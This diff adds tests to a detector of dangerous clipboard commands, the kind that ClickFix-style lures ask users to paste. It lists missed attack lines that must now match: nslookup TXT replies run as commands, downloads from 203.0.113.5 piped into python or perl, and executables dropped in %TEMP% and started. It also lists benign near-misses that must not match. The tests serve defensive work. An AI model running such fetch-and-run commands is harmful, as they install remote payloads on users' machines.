@@ -126,11 +126,43 @@ Deno.test("clipboard guard patterns: /, Unicode dashes, switch prefixes, WindowS
   assert(fp.length === 0, "false positive: " + JSON.stringify(fp));
 });
 
+// The DNS form of ClickFix (nslookup reply run as commands), a download piped
+// into python / perl / ruby, and a download into %TEMP% that is started on the
+// same line. These passed before (2026-11-27).
+const MISSED_2026_11_27_B = [
+  "cmd /c \"nslookup -q=txt verify.example 203.0.113.5 | findstr ^Name: > %TEMP%\\a.cmd && %TEMP%\\a.cmd\"",
+  "nslookup verify.example 203.0.113.5 | findstr \"^Name:\" | for /f \"tokens=1,* delims=:\" %a in ('more') do @echo %b | cmd",
+  "curl -k https://203.0.113.5/a -o $env:TEMP\\a.exe; Start-Process $env:TEMP\\a.exe",
+  "curl -o %APPDATA%\\u.exe https://203.0.113.5/u.exe & start %APPDATA%\\u.exe",
+  "wget -O- http://203.0.113.5/a | python3",
+  "curl http://203.0.113.5/a.py | python",
+  "curl -fsSL http://203.0.113.5/a | sudo /usr/bin/python3 -",
+  "curl -s http://203.0.113.5/a.pl | perl",
+];
+const BENIGN_2026_11_27_B = [
+  "curl https://example.test/data.json | python3 -m json.tool",
+  "curl -s https://api.example.test | python -c 'import json,sys'",
+  "curl https://example.test/install.pl | perl -c",
+  "nslookup example.com",
+  "nslookup example.com | findstr Address",
+  "curl -o %TEMP%\\a.zip https://example.test/?a=1&b=2",
+  "curl -o %TEMP%\\a.zip https://example.test/start",
+  "wget -O $env:TEMP\\a.zip https://example.test/a.zip",
+];
+
+Deno.test("clipboard guard patterns: nslookup run as commands, pipe to python/perl/ruby and a %TEMP% download started on the line match; near misses do not", () => {
+  const g = loadClip();
+  const missed = MISSED_2026_11_27_B.filter((s) => !g.matchDangerous(s));
+  assert(missed.length === 0, "missed: " + JSON.stringify(missed));
+  const fp = BENIGN_2026_11_27_B.filter((s) => g.matchDangerous(s));
+  assert(fp.length === 0, "false positive: " + JSON.stringify(fp));
+});
+
 Deno.test("clipboard guard patterns stay linear: 100 KB adversarial inputs are checked fast", () => {
   const g = loadClip();
   const size = 100 * 1024;
   const fill = (unit) => unit.repeat(Math.ceil(size / unit.length)).slice(0, size);
-  const inputs = ["curl|", "curl | ", "curl |/", "wget | sudo ", "bash <(", "sh -c $(", "finger |", "\\\\a", "\\\\a@", "msiexec /i ", "regsvr32 /i:", "powershell -f ", "pwsh ", "pwsh /", "pwsh \u2013", "cmd /q", "cmd/v:on ", "a", " ", "/"].map(fill);
+  const inputs = ["curl|", "curl | ", "curl |/", "wget | sudo ", "bash <(", "sh -c $(", "finger |", "\\\\a", "\\\\a@", "msiexec /i ", "regsvr32 /i:", "powershell -f ", "pwsh ", "pwsh /", "pwsh \u2013", "cmd /q", "cmd/v:on ", "nslookup ", "nslookup >", "curl | python", "curl -o %temp% ", "curl -o %temp%&", "a", " ", "/"].map(fill);
   // A generous limit: the machine is shared. A quadratic pattern takes
   // seconds on these inputs.
   const LIMIT_MS = 500;
